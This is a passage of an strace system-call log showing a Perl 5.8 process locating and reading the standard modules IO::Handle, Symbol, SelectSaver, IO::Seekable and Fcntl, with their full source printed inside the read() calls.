6692  07:15:04.954389 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954402 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954415 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
6692  07:15:04.954436 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.954450 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.954461 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.954497 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
6692  07:15:04.954897 stat64("/etc/perl/Symbol.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.954913 stat64("/etc/perl/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.954927 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.954939 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.954953 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.954966 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955026 stat64("/usr/lib/perl5/Symbol.pmc",  <unfinished ...>
6690  07:15:04.955064 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6692  07:15:04.955090 <... stat64 resumed> 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955097 stat64("/usr/lib/perl5/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955111 stat64("/usr/share/perl5/Symbol.pmc",  <unfinished ...>
6690  07:15:04.955128 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
6692  07:15:04.955137 <... stat64 resumed> 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955144 stat64("/usr/share/perl5/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955157 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955169 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6690  07:15:04.955185 <... rt_sigprocmask resumed> [], 8) = 0
6692  07:15:04.955194 stat64("/usr/share/perl/5.8/Symbol.pmc",  <unfinished ...>
6690  07:15:04.955204 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
6692  07:15:04.955212 <... stat64 resumed> 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6690  07:15:04.955218 <... rt_sigprocmask resumed> NULL, 8) = 0
6690  07:15:04.955224 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
6692  07:15:04.955231 stat64("/usr/share/perl/5.8/Symbol.pm",  <unfinished ...>
6690  07:15:04.955239 <... rt_sigprocmask resumed> [], 8) = 0
6692  07:15:04.955246 <... stat64 resumed> {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
6690  07:15:04.955260 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
6692  07:15:04.955270 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE <unfinished ...>
6690  07:15:04.955278 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
6690  07:15:04.955286 waitpid(-1,  <unfinished ...>
6692  07:15:04.955297 <... open resumed> ) = 8
6692  07:15:04.955305 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.955316 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.955334 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
6692  07:15:04.955807 read(8, "", 4096) = 0
6692  07:15:04.955822 close(8)          = 0
6692  07:15:04.955886 stat64("/etc/perl/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955902 stat64("/etc/perl/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955916 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955930 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955944 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.955961 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956055 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956085 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956099 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956139 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956153 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956166 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956180 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.956193 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
6692  07:15:04.956214 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.956228 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.956240 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.956259 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
6692  07:15:04.956384 brk(0x81d6000)    = 0x81d6000
6692  07:15:04.956414 read(8, "", 4096) = 0
6692  07:15:04.956426 close(8)          = 0
6692  07:15:04.956898 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
6692  07:15:04.957670 read(6, "", 4096) = 0
6692  07:15:04.957687 close(6)          = 0
6692  07:15:04.957726 stat64("/etc/perl/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957742 stat64("/etc/perl/IO/Seekable.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957756 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957769 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957783 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957796 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957810 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957822 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957836 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957848 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957861 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.957874 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
6692  07:15:04.957895 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.957910 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.957922 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.957940 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
6692  07:15:04.958018 stat64("/etc/perl/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958035 stat64("/etc/perl/Fcntl.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958063 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958076 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958090 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958103 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958117 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958129 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958142 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958154 stat64("/usr/share/perl5/Fcntl.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958167 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.958180 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
6692  07:15:04.958201 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.958215 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.958227 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.958246 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
6692  07:15:04.958306 brk(0x81f7000)    = 0x81f7000
6692  07:15:04.959029 read(8, "", 4096) = 0
6692  07:15:04.970682 close(8)          = 0
6692  07:15:04.970767 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6692  07:15:04.970793 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
